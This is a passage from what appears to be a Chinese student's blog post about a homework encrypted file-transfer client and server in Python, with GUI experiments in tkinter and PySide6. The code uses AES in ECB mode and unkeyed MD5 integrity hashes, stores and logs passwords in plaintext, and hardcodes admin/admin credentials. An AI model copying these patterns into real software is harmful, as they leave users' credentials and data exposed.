s1.grid(row=0,column=1,sticky=NS) c1.config(yscrollcommand=s1.set) frame1 = Frame(c1) c1.create_window((0, 0), window=frame1, anchor=&#x27;nw&#x27;) for i in range(20): Label(frame1, text=f&quot;Label &#123;i+1&#125;&quot;).pack() frame1.update_idletasks() c1.config(scrollregion=c1.bbox(&quot;all&quot;)) root.mainloop()if __name__ == &quot;__main__&quot;: main() 创建出一个canvas控件后 还需要创建一个内部窗口 用来显示文本或者图片scrollbar绑定的是canvas 但是输出的文本还是依靠label tkinter实际利用基于tk来实现图形化界面 现在主要是卡在滚动条的实现 本来预期是打算设计成上面部分用来显示操作界面 下面用来输出信息然后下面的部分本来想着是加一个滚动条来查看输出信息过多的情况下以往的输出信息但是tk的滚动条实现起来实在有点太麻烦了 而且tk的美观程度也很差 就是因为他的控件布局太难用了 所以写到这里就烂尾了 看看后面还有没有兴趣搞下去吧 暂时是打算转用pyside6了 import socketimport structimport hashlibimport timefrom tkinter import *from PIL import Image, ImageTkfrom cryptography.hazmat.primitives import serializationfrom cryptography.hazmat.primitives.asymmetric import dhfrom cryptography.hazmat.backends import default_backendfrom Crypto.Util.Padding import pad, unpadfrom tkinter.ttk import Separatorfrom Crypto.Cipher import AESdef add_message_to_frame2(frame2, text, row=None, column=0, sticky=W): &quot;&quot;&quot;统一处理向frame2添加消息的函数&quot;&quot;&quot; if not hasattr(frame2, &#x27;current_row&#x27;): frame2.current_row = 0 if not hasattr(frame2, &#x27;max_rows&#x27;): frame2.max_rows = 5 if row is None: row = frame2.current_row # 如果超过最大行数，清除所有控件并重置行计数 if frame2.current_row &gt;= frame2.max_rows: for widget in frame2.winfo_children(): widget.destroy() frame2.current_row = 0 Label(frame2, text=text, bg=&quot;white&quot;).grid(row=frame2.current_row, column=column, sticky=sticky) frame2.current_row += 1def md5_encrypt(data): #md5加密 用于完整性检测 md5_hash = hashlib.md5() if isinstance(data,str): data = data.encode() md5_hash.update(data) hash_result = md5_hash.hexdigest() return hash_resultdef pack_data(choice,data,shared_key,sliced,sum): #将数据打包成报文 格式: sliced_judge(4bytes)+data_length(4bytes)+data_type(4bytes)+encrypted_data(Dynamic)+md5_data(32bytes) sliced_sum = struct.pack(&#x27;&gt;H&#x27;,sum) sliced_num = struct.pack(&#x27;&gt;H&#x27;,sliced) choice_type = struct.pack(&#x27;&gt;I&#x27;,choice) en_data = encrypt_data(shared_key,data) hash_data = md5_encrypt(data).encode() temp = choice_type+en_data+hash_data transfer_data = sliced_sum+sliced_num+struct.pack(&#x27;&gt;I&#x27;,len(temp)+8)+temp return transfer_datadef key_switch(private_key_client,frame1,frame2,ipaddr,s,public_key_client): #交换公钥 ip = ipaddr.get() s.connect((ip,6666)) add_message_to_frame2(frame2, &quot;连接上服务端 开始进行公钥交换&quot;) for widget in frame1.winfo_children(): widget.destroy() public_key_bytes = public_key_client.public_bytes( encoding=serialization.Encoding.PEM, format=serialization.PublicFormat.SubjectPublicKeyInfo) s.send(public_key_bytes) public_key_server = s.recv(1024) public_key_server = serialization.load_pem_public_key(public_key_server) add_message_to_frame2(frame2, &quot;公钥交换成功,开始计算共享密钥&quot;) shared_key = private_key_client.exchange(public_key_server) Authentication(s,shared_key,frame1,frame2) def encrypt_data(shared_key,data): #aes加密 key = shared_key[:16] aes = AES.new(key,AES.MODE_ECB) if isinstance(data,str): data = data.encode() data_bytes = pad(data, AES.block_size) encrypt_data = aes.encrypt(data_bytes) return encrypt_datadef finish_connect(s): s.close() exit()def menu(s,shared_key,frame1,frame2): for widget in frame1.winfo_children(): widget.destroy() button1 = Button(frame1,text=&quot;传输文本&quot;,command=lambda:transfer_txt(s,shared_key,frame1,frame2)).grid(row=0,column=0,padx=60,pady=20) button2 = Button(frame1,text=&quot;传输文件&quot;,command=lambda:transfer_file(s,shared_key)).grid(row=0,column=1) button3 = Button(frame1,text=&quot;注册用户&quot;,command=lambda:register(s,shared_key)).grid(row=1,column=0) button4 = Button(frame1,text=&quot;退出程序&quot;,command=lambda:finish_connect(s)).grid(row=1,column=1)def login(entry1,entry2,s,shared_key,frame2,frame1): username = entry1.get() password = entry2.get() data = username+&quot;;&quot;+password transfer_data = encrypt_data(shared_key,data) #使用aes加密账号密码 s.send(transfer_data) text = (s.recv(1024)).decode() if text == &quot;你输入的用户名不存在 终止本次连接&quot;: add_message_to_frame2(frame2, text) s.close() elif text == &quot;密码错误，终止连接&quot;: add_message_to_frame2(frame2, text) s.close() else: add_message_to_frame2(frame2, text) menu(s,shared_key,frame1,frame2)def focus_next(entry): entry.focus()def Authentication(s,shared_key,frame1,frame2): add_message_to_frame2(frame2, &quot;开始进行身份验证&quot;) Label(frame1,text=&quot;用户名&quot;).grid(row=0,pady=30) Label(frame1,text=&quot;密码&quot;).grid(row=1) entry1 = Entry(frame1) entry1.grid(row=0,column=1,padx=10) entry2 = Entry(frame1) entry1.bind(&quot;&lt;Return&gt;&quot;,lambda event:focus_next(entry2)) entry2.grid(row=1,column=1,padx=10) entry2.bind(&quot;&lt;Return&gt;&quot;,lambda event:login(entry1,entry2,s,shared_key,frame2,frame1)) Button(frame1,text=&quot;登录&quot;,height=3,width=7,command=lambda : login(entry1,entry2,s,shared_key,frame2,frame1)).grid(row=0,column=2,rowspan=2,pady=(30,0)) def register(s,shared_key): username = input(&quot;输入用户名 :&quot;) #账号密码用;来间隔后 采用base64编码后丢到pack_data函数中处理 password = input(&quot;输入密码 :&quot;) data = username+&quot;;&quot;+password transfer_data = pack_data(3,data,shared_key,0,0) s.send(transfer_data)def transfer_txt1(entry1,s,shared_key,frame2): text = entry1.get(&#x27;1.0&#x27;,END) if len(text) &gt; 1024: sliced = 0 chunk_size = 1024 sliced_data = slice_string(text, chunk_size) sliced_sum = len(sliced_data) for i in range(len(sliced_data)): transfer_data = pack_data(1,sliced_data[i],shared_key,sliced,sliced_sum) sliced += 1 try: s.send(transfer_data) add_message_to_frame2(frame2, &quot;发送成功&quot;) except Exception as e: add_message_to_frame2(frame2, f&quot;发送失败,错误信息:&#123;e&#125;&quot;) else : sliced = 0 sliced_sum = 0 transfer_data = pack_data(1,text,shared_key,sliced,sliced_sum) try: s.send(transfer_data) add_message_to_frame2(frame2, &quot;发送成功&quot;) except Exception as e: add_message_to_frame2(frame2, f&quot;发送失败,错误信息:&#123;e&#125;&quot;) print((s.recv(1024)).decode())def transfer_txt(s,shared_key,frame1,frame2): #这个函数负责处理直接传输的文本数据 但是仍然对于是否需要切片进行了判断 for widget in frame1.winfo_children(): widget.destroy() s1 = Scrollbar(frame1,width=20) Label(frame1,text=&quot;传输数据:&quot;).grid(row=0,column=0,sticky=W,padx=5) s1.grid(row=1,column=1,sticky=NS) text = Text(frame1,width=38,height=6,yscrollcommand=s1.set,wrap=CHAR) text.grid(row=1,column=0,padx=5) Button(frame1,command=lambda:transfer_txt1(text,s,shared_key,frame2),text=&quot;发送&quot;).grid(row=2,column=0,pady=5,sticky=E) def slice_string(data, chunk_size): #根据指定大小切片字符串 return [data[i:i + chunk_size] for i in range(0, len(data), chunk_size)]def transfer_file(s,shared_key): file_addr = input(&quot;请输入文件对于client.py的相对路径 :&quot;) #读取客户端本地文件的二进制流 with open(file_addr,&#x27;rb&#x27;) as file: text = file.read() transfer_data = [] if len(text) &gt; 1024: sliced = 0 chunk_size = 1024 sliced_data = slice_string(text, chunk_size) sliced_sum = len(sliced_data) print(f&quot;一共有&#123;sliced_sum&#125;组数据需要传输\\n&quot;) begin_time = time.time() for i in range(len(sliced_data)): sliced += 1 transfer_data.append(pack_data(2,sliced_data[i],shared_key,sliced,sliced_sum)) for i in range(sliced_sum): s.sendall(transfer_data[i]) time.sleep(0.06) currect_time = time.time() temp = currect_time-begin_time print(&quot;\\r&quot;+f&quot;正在传输第&#123;i+1&#125;组 当前运行了&#123;temp:.2f&#125;s&quot;,end=&quot;&quot;) print(&quot;\\n&quot;,end=&quot;&quot;) else : sliced = 0 sliced_sum = 0 transfer_data = pack_data(2,text,shared_key,sliced,sliced_sum) s.send(transfer_data) print((s.recv(1024)).decode()+&quot;\\n&quot;) def main(): # 固定的 DH 参数 p = 167369435262828772525424092470263277532300828423668354542113388987940885403967569624276882159444702063514952468172684099658558089467275283830276841486674376457626767287709752368374119769545320657500942952067517443133715688577345716588234520369470508343544601072272539124731608794518466242096737284389743744833 g = 2 parameters = dh.DHParameterNumbers(p, g).parameters(backend=default_backend()) private_key_client = parameters.generate_private_key() public_key_client = private_key_client.public_key() s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) root = Tk() root.title(&quot;协议大作业-第六组&quot;) root.geometry(&quot;300x300&quot;) frame1 = Frame(root,width=300,height=150) frame2 = Frame(root,width=300,height=150,bg=&quot;white&quot;) frame2.current_row = 0 frame2.max_rows = 6 # 设置最大显示行数 Label(frame1,text=&quot;ip地址:&quot;).grid(row=0,padx=10,pady=50) #输入ip地址 ipaddr = Entry(frame1) ipaddr.bind(&quot;&lt;Return&gt;&quot;,lambda event:key_switch(private_key_client,frame1,frame2,ipaddr,s,public_key_client)) ipaddr.grid(row=0,column=1) Button(frame1,text=&quot;连接&quot;,command=lambda: key_switch(private_key_client,frame1,frame2,ipaddr,s,public_key_client),width=10).grid(row=0,column=2,padx=10) frame1.grid(row=0) frame1.grid_propagate(0) frame2.grid(row=2) frame2.grid_propagate(0) separator = Frame(root, height=2, bd=1, relief=SUNKEN) #分割线 separator.grid(row=1, column=0, sticky=EW) root.mainloop()if __name__ == &quot;__main__&quot;: main() pyside6学习简单窗口显示from PySide6.QtWidgets import *def main(): app = QApplication() window = QWidget() window.setWindowTitle(&quot;安全协议大作业&quot;) window.setFixedSize(400,300) label = QLabel(&quot;测试输出&quot;,window) label.move(175,125) window.show() app.exec() if __name__ == &quot;__main__&quot;: main() 上述程序可以创建出一个窗口后简单的输出文字 总体的逻辑是和tk差不多的需要创建一个窗口对象 然后给窗口增加控件 qt designer我觉得pyside6相较于tk最显著的优势就是 可以使用编辑工具来简化ui的设计如图所示 设计一个简单的ui保存ui文件 在程序中载入ui 然后加载到一个窗口上 import sysfrom PySide6.QtWidgets import *from PySide6.QtCore import QFile, QIODevicefrom PySide6.QtUiTools import QUiLoaderfrom PySide6.QtWidgets import QApplicationdef main(): ui_file = QFile(&quot;test.ui&quot;) loader = QUiLoader() app = QApplication() window = loader.load(ui_file) window.setWindowTitle(&quot;安全协议大作业&quot;) # window.setFixedSize(400,300) ui_file.close() window.show() app.exec() if __name__ == &quot;__main__&quot;: main() 可以看到非常简单的就实现了这几个控件 比tk挪半天位置好用多了 tk是人用的吗??? 函数绑定解决了ui设计的难题后 接下来的重点就是放在函数的绑定上 其实也很简单 就是要注意自己在qt designer中定义的控件名称然后需要把ui文件转化成py文件 pyside6-uic filename.ui -o filename.py 随后在程序中直接导入即可然后函数绑定的大体上是和tk一致的 具体到各个控件的方法有些不太一样 就有需求的自己查询 这里放一个我自己弄的账号密码登录程序 import sysfrom PySide6.QtWidgets import *from ui import Ui_Formclass mywindow(QMainWindow,Ui_Form): def __init__(self): QMainWindow.__init__(self) self.setupUi(self) hide_pwd = self.checkBox.stateChanged.connect(lambda:self.hide_password()) login_button = self.b1.clicked.connect(lambda:self.login()) exit_button = self.pushButton_2.clicked.connect(lambda:self.exit_process()) def exit_process(self): exit() def hide_password(self): state = self.lineEdit_2.echoMode() if str(state) == &quot;EchoMode.Password&quot;: self.lineEdit_2.setEchoMode(QLineEdit.EchoMode.Normal) else : self.lineEdit_2.setEchoMode(QLineEdit.EchoMode.Password) def login(self): username = self.lineEdit.text() password = self.lineEdit_2.text() if username == &quot;admin&quot; and password == &quot;admin&quot;: msg = &quot;登录成功&quot; QMessageBox.information(self,&#x27;输出信息&#x27;,msg) elif len(username)==0: msg = &quot;必须输入账号&quot; QMessageBox.information(self,&#x27;输出信息&#x27;,msg) elif len(password) ==0: msg = &quot;必须输入密码&quot; QMessageBox.information(self,&#x27;输出信息&#x27;,msg) elif username != &quot;admin&quot;: msg = &quot;账号不存在&quot; QMessageBox.information(self,&#x27;输出信息&#x27;,msg) elif password != &quot;admin&quot;: msg = &quot;密码错误&quot; QMessageBox.information(self,&#x27;输出信息&#x27;,msg) def main(): app = QApplication() w1 = mywindow() w1.show() app.exec() if __name__ == &quot;__main__&quot;: main() 写这么久博客第一次放gif图 看起来画质一般般 而且也捕获不到弹出的第二个窗口 哎下次改进吧 最终代码v1.0版本最后采用了pyside6作为图形化界面框架 把客户端用图形化界面包了起来同时为了配合客户端的优化 服务端也作了一些修改服务端 import socketimport hashlibimport magicimport timefrom cryptography.hazmat.primitives import serializationfrom cryptography.hazmat.primitives.asymmetric import dhfrom cryptography.hazmat.backends import default_backendfrom Crypto.Util.Padding import pad, unpadfrom Crypto.Cipher import AESimport sqlite3from concurrent.futures import ThreadPoolExecutorimport threadingmime = magic.Magic(mime=True)def menu(sock): text = &quot;开始传输数据&quot; sock.send(text.encode())def write_log(log_file,text): current_time = time.asctime(time.localtime(time.time())) text += &quot; &quot;+current_time log_file.write(text.encode()+b&quot;\\n&quot;)class query_thread(threading.Thread): def __init__(self,name = None): threading.Thread.__init__(self,name=name) def query_username(self,username): conn = sqlite3.connect(&#x27;users.db&#x27;) cursor = conn.cursor() cursor.execute(&quot;SELECT username FROM users WHERE username = ?&quot;, (username,)) result = cursor.fetchone() cursor.close() return result def query_password(self,username,password): conn = sqlite3.connect(&#x27;users.db&#x27;) cursor = conn.cursor() cursor.execute(&quot;SELECT password FROM users WHERE username = ? AND password = ?&quot;, (username, password)) result = cursor.fetchone() cursor.close() return result def add_user(self,sock,username,password,addr,login_username,log_file): conn = sqlite3.connect(&#x27;users.db&#x27;) cursor = conn.cursor() try: # 插入新的用户数据 cursor.execute(&quot;INSERT INTO users (username, password) VALUES (?, ?)&quot;, (str(username), str(password))) conn.commit() except sqlite3.IntegrityError: sock.send(&quot;用户已存在&quot;.encode()) print(f&quot;&#123;threading.current_thread().name&#125;:用户&#123;username&#125;已存在,注册失败&quot;) text = f&quot;客户机&#123;addr&#125;使用管理员权限用户(&#123;login_username&#125;)注册新用户(&#123;username&#125;)失败 因为用户已存在&quot; write_log(log_file,text) except Exception as e: sock.send(e.encode()) sock.send(&quot;用户注册成功&quot;.encode()) print(f&quot;&#123;threading.current_thread().name&#125;:用户&#123;username&#125;注册成功&quot;) text = f&quot;客户机&#123;addr&#125;使用管理员权限用户(&#123;login_username&#125;)注册新用户(&#123;username&#125;)成功 对应用户密码为(&#123;password&#125;)&quot; write_log(log_file,text)def md5_encrypt(data): if isinstance(data, str): data = data.encode() # md5加密需要bytes参数 md5_hash = hashlib.md5() #md5加密 md5_hash.update(data) hash_result = md5_hash.hexdigest() return hash_resultdef key_switch(sock,public_key_server): print(f&quot;&#123;threading.current_thread().name&#125;开始进行公钥交换&quot;) try: public_key_client = sock.recv(1024) except Exception as e: print(&quot;接受错误&quot;,e) public_key_bytes = public_key_server.public_bytes( #将客户端的公钥序列化为 PEM 格式的字节串 encoding=serialization.Encoding.PEM, format=serialization.PublicFormat.SubjectPublicKeyInfo) sock.send(public_key_bytes) return serialization.load_pem_public_key(public_key_client) #将接受到的服务端公钥反序列化为公钥对象def decrypt_data(shared_key,data): #data要为byte型 key = shared_key[:16] aes = AES.new(key,AES.MODE_ECB) if isinstance(data,str): data = data.encode() decrypted_data = aes.decrypt(data) data = (unpad(decrypted_data, 16)) return datadef unpack_data(sock,shared_key,orign_data,log_file,addr): #拆解数据包 sliced_sum = int.from_bytes(orign_data[:2],byteorder = &#x27;big&#x27;) sliced_num = int.from_bytes(orign_data[2:4],byteorder=&#x27;big&#x27;) data_length = int.from_bytes(orign_data[4:8], byteorder=&#x27;big&#x27;) data_type = int.from_bytes(orign_data[8:12], byteorder=&#x27;big&#x27;) data_md5 = (orign_data[-32:]).decode() data = decrypt_data(shared_key,orign_data[12:(data_length-32)]) value = verify_md5(data,data_md5) if value == False: fail_number = sliced_num else: fail_number = None return sliced_sum,sliced_num,data_type,data,fail_numberdef Authentication(sock,shared_key,query_thread1,addr,log_file): #身份验证部分 账号密码存储在users.db数据库中 key = shared_key[:16] aes = AES.new(key,AES.MODE_ECB) en_data = (sock.recv(1024)) if len(en_data) == 0: text = f&quot;客户机&#123;addr&#125;中断连接&quot; write_log(log_file,text) log_file.close() sock.close() print(f&quot;&#123;threading.current_thread().name&#125;:客户机中断连接&quot;) return data = decrypt_data(shared_key,en_data) parts = data.split(b&#x27;;&#x27;) username = parts[0].decode() password = parts[1].decode() result = query_thread1.query_username(username) if result != None: result = query_thread1.query_password(username,password) if result != None: sock.send(&quot;身份验证通过&quot;.encode()) if username == &quot;admin&quot;: permission_value = 1 else : permission_value = 0 text = f&quot;客户机&#123;addr&#125;使用用户名(&#123;username&#125;)密码(&#123;password&#125;)进行身份验证通过&quot; write_log(log_file,text) return permission_value,username else : sock.send(&quot;密码错误，终止连接&quot;.encode()) text = f&quot;客户机&#123;addr&#125;尝试登录用户(&#123;username&#125;)输入密码(&#123;password&#125;),密码错误登录失败&quot; write_log(log_file,text) sock.close() return 3,username else: sock.send(&quot;你输入的用户名不存在 终止本次连接&quot;.encode()) text = f&quot;客户机&#123;addr&#125;尝试登录用户(&#123;username&#125;),但是用户不存在&quot; write_log(log_file,text) sock.close() return 3,usernamedef transfer_txt(addr,data,log_file): print(f&quot;&#123;threading.current_thread().name&#125;客户机&#123;addr&#125;传输的数据为: &#123;data&#125;&quot;) current_time = time.asctime(time.localtime(time.time())) text = f&quot;客户机&#123;addr&#125;传输的数据为: &#123;data&#125; &quot;+current_time write_log(log_file,text)def transfer_file(sock,data,addr,log_file): #处理非切片数据 data_type = mime.from_buffer(data) filename = &quot;output/&quot;+addr try: if data_type == &quot;text/plain&quot;: filename += &quot;.txt&quot; with open(filename, &#x27;wb&#x27;) as f: f.write(data) elif data_type == &quot;text/x-c&quot;: filename += &quot;.c&quot; with open(filename,&#x27;wb&#x27;) as f: f.write(data) else : print(f&quot;没有识别到文件类型&#123;data_type&#125;,暂时存放在temp中&quot;) filename += &quot;-temp&quot; with open(filename,&#x27;wb&#x27;) as f: f.write(data) text = f&quot;客户机&#123;addr&#125;传输了&#123;filename&#125;&quot; write_log(log_file,text) sock.send(&quot;\\n成功接受到文件&quot;.encode()) print(f&quot;&#123;threading.current_thread().name&#125;:成功接受到文件&#123;filename&#125;&quot;) except Exception as e: text = f&quot;保存文件时发生错误 错误信息:&#123;e&#125;&quot; print(f&quot;&#123;threading.current_thread().name&#125;:&quot;+text) text = f&quot;客户机&#123;addr&#125;保存文件时发生错误 错误信息&#123;e&#125;&quot; write_log(log_file,text) sock.send(text.encode())def transfer_file2(sock,first_data,sliced_sum,sliced_num,shared_key,addr,log_file): #处理切片数据 data_bytes = first_data orign_data = [] fail_number = [] for i in range(sliced_sum-1): text = sock.recv(1084) orign_data.append(text) if len(text) == 0: text = f&quot;客户机&#123;addr&#125;中断连接&quot; write_log(log_file,text) log_file.close() print(f&quot;&#123;threading.current_thread().name&#125;:客户机中断连接&quot;) sock.close() return print(f&quot;&#123;threading.current_thread().name&#125;:开始进行数据处理&quot;) for i in range(sliced_sum-1): print(f&quot;\\r&#123;threading.current_thread().name&#125;:正在处理第&#123;i+1&#125;组数据&quot;,end=&quot;&quot;) sliced_sum,sliced_num,data_type,data,fail = unpack_data(sock,shared_key,orign_data[i],log_file,addr) if fail != None: fail_number.append(fail) data_bytes += data if len(fail_number)&gt;0: fail_meg = &quot;,&quot;.join(fail_number) print(f&quot;&#123;threading.current_thread().name&#125;:传输中出现校验错误的切片编号为:&#123;fail_meg&#125;&quot;) text = f&quot;客户机&#123;addr&#125;传输中出现了校验错误 切片编号为&#123;fail_meg&#125;&quot; write_log(log_file,text) else: print(f&quot;&#123;threading.current_thread().name&#125;:本次传输没有出现校验错误&quot;) data_type = mime.from_buffer(data_bytes) filename = &quot;output/&quot;+addr try: if data_type == &quot;image/png&quot;: filename += &quot;.png&quot; with open(filename, &#x27;wb&#x27;) as f: f.write(data_bytes) elif data_type == &quot;audio/mpeg&quot;: filename += &quot;.mp3&quot; with open(filename, &#x27;wb&#x27;) as f: f.write(data_bytes) elif data_type == &quot;text/x-c&quot;: filename += &quot;.c&quot; with open(filename,&#x27;wb&#x27;) as f: f.write(data_bytes) else: print(f&quot;&#123;threading.current_thread().name&#125;:没有识别到文件类型&#123;data_type&#125;,暂时存放在temp中&quot;) filename += &quot;-temp&quot; with open(filename,&#x27;wb&#x27;) as f: f.write(data_bytes) text = f&quot;客户机&#123;addr&#125;传输了&#123;filename&#125;&quot; write_log(log_file,text) sock.send(&quot;\\n成功接受到文件&quot;.encode()) print(f&quot;&#123;threading.current_thread().name&#125;:成功接受到文件&#123;filename&#125;&quot;) except Exception as e: text = f&quot;保存文件时发生错误 错误信息:&#123;e&#125;&quot; print(f&quot;&#123;threading.current_thread().name&#125;:&quot;+text) text = f&quot;客户机保存文件时发生错误 错误信息&#123;e&#125;&quot; write_log(log_file,text) sock.send(text.encode()) def register(permission_value,sock,data,query_thread1,log_file,addr,login_username): if permission_value == 0: #管理员权限的检验较为简单 sock.send(&quot;你所登录的用户并没有拥有管理员权限 无法注册用户&quot;.encode()) text = f&quot;客户机&#123;addr&#125;尝试使用非管理员权限用户(&#123;login_username&#125;)注册新用户&quot; write_log(log_file,text) return else : parts = data.split(b&#x27;;&#x27;) username = parts[0].decode() password = parts[1].decode() try: query_thread1.add_user(sock,username,password,addr,login_username,log_file) except Exception as e: print(e) returndef verify_md5(data, original_md5): current_md5 = md5_encrypt(data) return current_md5 == original_md5def transfer_function(sock,addr,public_key_server,private_key_server,query_thread1): addr = format(addr[0]) log_name = &quot;logfile/&quot;+addr+&quot;-log&quot; try: log_file = open(log_name,&#x27;ab+&#x27;) except Exception as e: print(f&quot;&#123;threading.current_thread().name&#125;创建日志文件失败,错误信息:&#123;e&#125;&quot;) text = f&quot;客户机&#123;addr&#125;连接成功&quot; write_log(log_file,text) print(f&quot;&#123;threading.current_thread().name&#125;:客户机&#123;addr&#125;连接成功&quot;) public_key_client = key_switch(sock,public_key_server) print(f&quot;&#123;threading.current_thread().name&#125;:客户机&#123;addr&#125;公钥交换成功&quot;) print(f&quot;&#123;threading.current_thread().name&#125;:开始计算共享密钥&quot;) shared_key = private_key_server.exchange(public_key_client) print(f&quot;&#123;threading.current_thread().name&#125;:开始进行身份验证&quot;) permission_value,username = Authentication(sock,shared_key,query_thread1,addr,log_file) if permission_value == 3: text = f&quot;客户机&#123;addr&#125;中断连接&quot; write_log(log_file,text) log_file.close() sock.close() print(f&quot;&#123;threading.current_thread().name&#125;:客户机中断连接&quot;) return print(f&quot;&#123;threading.current_thread().name&#125;:身份验证通过 开始处理客户机&#123;addr&#125;的数据传输&quot;) while 1: fail_number = [] orign_data = (sock.recv(1084)) if len(orign_data) == 0: text = f&quot;客户机&#123;addr&#125;中断连接&quot; write_log(log_file,text) log_file.close() print(f&quot;&#123;threading.current_thread().name&#125;:客户机中断连接&quot;) break sliced_sum,sliced_num,data_type,data,fail = unpack_data(sock,shared_key,orign_data,log_file,addr) if fail != None: fail_number.append(fail) if len(fail_number)&gt;0: fail_meg = &quot;,&quot;.join(fail_number) print(f&quot;&#123;threading.current_thread().name&#125;:传输中出现校验错误的切片编号为:&#123;fail_meg&#125;&quot;) text = f&quot;客户机&#123;addr&#125;传输中出现了校验错误 切片编号为&#123;fail_meg&#125;&quot; write_log(log_file,text) else: print(f&quot;&#123;threading.current_thread().name&#125;:本次传输没有出现校验错误&quot;) if data_type == 1: text = f&quot;客户机&#123;addr&#125;执行了传输文本数据操作&quot; write_log(log_file,text) transfer_txt(addr,data,log_file) elif data_type == 2: if sliced_sum != 0 or sliced_num != 0: text = f&quot;客户机&#123;addr&#125;执行了传输文件操作,并且传输的文件过大需要切片传输,切片总数为&#123;sliced_sum&#125;&quot; write_log(log_file,text) transfer_file2(sock,data,sliced_sum,sliced_num,shared_key,addr,log_file) else: text = f&quot;客户机&#123;addr&#125;执行了传输文件操作&quot; write_log(log_file,text) transfer_file(sock,data,addr,log_file) elif data_type ==3: text = f&quot;客户机&#123;addr&#125;执行了注册账号操作&quot; write_log(log_file,text) register(permission_value,sock,data,query_thread1,log_file,addr,username)def main(): # 固定的 DH 参数 p = 167369435262828772525424092470263277532300828423668354542113388987940885403967569624276882159444702063514952468172684099658558089467275283830276841486674376457626767287709752368374119769545320657500942952067517443133715688577345716588234520369470508343544601072272539124731608794518466242096737284389743744833 g = 2 pool = ThreadPoolExecutor(max_workers=5) #定义一个线程池 拥有5个空闲线程 query_thread1 = query_thread() #定义一个线程对象 后面用于数据库查询 因为数据库查询只能放在一个线程里使用 parameters = dh.DHParameterNumbers(p, g).parameters(backend=default_backend()) private_key_server = parameters.generate_private_key() public_key_server = private_key_server.public_key() s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #创建套接字 默认使用TCP协议 s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) #允许在端口上处于 TIME_WAIT 状态时再次绑定 s.bind((&quot;192.168.220.130&quot;,6666)) s.listen(5) #最多连接5个客户端 while 1: print(f&quot;&#123;threading.current_thread().name&#125;:等待客户机连接&quot;) sock,addr = s.accept() client_thread = pool.submit(transfer_function,sock,addr,public_key_server,private_key_server,query_thread1) if __name__ == &quot;__main__&quot;: main() 客户端 ```import socketimport structimport hashlibimport timefrom cryptography.hazmat.primitives import serializationfrom cryptography.hazmat.primitives.asymmetric import dhfrom cryptography.hazmat.backends import default_backendfrom Crypto.Util.Padding import pad, unpadfrom PySide6.QtWidgets import *from Crypto.Cipher import AESfrom ip_connect import Ipwindowfrom login import loginwindowfrom main import mainwindowfrom progressbar import barwindowfrom register import registerwindowclass ipwindow(QMainWindow,Ipwindow): def __init__(self): QMainWindow.__init__(self) self.setupUi(self) self.setWindowTitle(&quot;安全协议大作业-第六组&quot;) l1 = self.lineEdit.returnPressed.connect(lambda:self.ip_connect()) b1 = self.pushButton.clicked.connect(lambda:self.ip_connect()) def ip_connect(self): ipaddr = self.lineEdit.text() key_switch(ipaddr,self) class loginwindow(QMainWindow,loginwindow): def __init__(self,s,shared_key): QMainWindow.__init__(self) self.setupUi(self) self.setWindowTitle(&quot;安全协议大作业-第六组&quot;) b1 = self.pushButton.clicked.connect(lambda:self.login(s,shared_key)) b2 = self.pushButton_2.clicked.connect(lambda:self.return_ipconnect()) l1 = self.lineEdit.returnPressed.connect(lambda:self.move_focus(self.lineEdit_2)) l2 = self.lineEdit_2.returnPressed.connect(lambda:self.login(s,shared_key)) def move_focus(self,lineEdit): lineEdit.setFocus() def return_ipconnect(self): self.close() ip_window = ipwindow() ip_window.show() def login(self,s,shared_key): username = self.lineEdit.text() if len(username) == 0: QMessageBox.information(None,&quot;报错信息&quot;,&quot;用户名不能为空&quot;,QMessageBox.StandardButton.Ok,QMessageBox.StandardButton.NoButton) else: password = self.lineEdit_2.text() if len(password) == 0: QMessageBox.information(None,&quot;报错信息&quot;,&quot;密码不能为空&quot;,QMessageBox.StandardButton.Ok,QMessageBox.StandardButton.NoButton) else: Authentication(s,shared_key,username,password,self)class mainwindow(QMainWindow,mainwindow): def __init__(self,s,shared_key): QMainWindow.__init__(self) self.setupUi(self) self.setWindowTitle(&quot;安全协议大作业-第六组&quot;) self.current_number = 1 b1 = self.pushButton.clicked.connect(lambda:self.choose_mode(1,s,shared_key)) b2 = self.pushButton_2.clicked.connect(lambda:self.choose_mode(2,s,shared_key)) b3 = self.pushButton_3.clicked.connect(lambda:self.choose_mode(3,s,shared_key)) b4 = self.pushButton_4.clicked.connect(lambda:self.return_ipconnect()) b5 = self.pushButton_5.clicked.connect(lambda:self.handle_send(s,shared_key)) b6 = self.pushButton_6.clicked.connect(lambda:self.clear_text()) def return_ipconnect(self): self.close() ip_window = ipwindow() ip_window.show() def clear_text(self): self.textEdit.clear() def choose_mode(self,mode,s,shared_key): self.current_number = mode if mode == 1: self.pushButton.setStyleSheet(&quot;background-color: grey;&quot;) self.pushButton_2.setStyleSheet(u&quot;background-image: url(:/F:/\\u4f5c\\u4e1a/python\\u7a0b\\u5e8f/1.jpg);&quot;) self.pushButton_3.setStyleSheet(u&quot;background-image: url(:/F:/\\u4f5c\\u4e1a/python\\u7a0b\\u5e8f/1.jpg);&quot;) elif mode ==2: self.pushButton_2.setStyleSheet(&quot;background-color: grey;&quot;) self.pushButton_3.setStyleSheet(u&quot;background-image: url(:/F:/\\u4f5c\\u4e1a/python\\u7a0b\\u5e8f/1.jpg);&quot;) self.pushButton.setStyleSheet(u&quot;background-image: url(:/F:/\\u4f5c\\u4e1a/python\\u7a0b\\u5e8f/1.jpg);&quot;) elif mode ==3: self.pushButton_3.setStyleSheet(&quot;background-color: grey;&quot;) self.pushButton_2.setStyleSheet(u&quot;background-image: url(:/F:/\\u4f5c\\u4e1a/python\\u7a0b\\u5e8f/1.jpg);&quot;) self.pushButton.setStyleSheet(u&quot;background-image: url(:/F:/\\u4f5c\\u4e1a/python\\u7a0b\\u5e8f/1.jpg);&quot;) register(s,shared_key,self) def handle_send(self,s,shared_key): if self.current_number == 1: transfer_txt(s,shared_key,self) elif self.current_number == 2: transfer_file(s,shared_key,self) class barwindow(QMainWindow,barwindow): def __init__(self,text,sliced_sum,transfer_data,s,main_window): QMainWindow.__init__(self) self.setupUi(self) self.progressBar.setValue(0) self.setWindowTitle(&quot;安全协议大作业-第六组&quot;) l1 = self.label.setText(text) b1 = self.pushButton_2.clicked.connect(lambda:self.start_transfer(sliced_sum,transfer_data,s,main_window)) b2 = self.pushButton.clicked.connect(lambda:self.end_transfer(s)) def start_transfer(self,sliced_sum,transfer_data,s,main_window): for i in range(sliced_sum): s.sendall(transfer_data[i]) time.sleep(0.06) 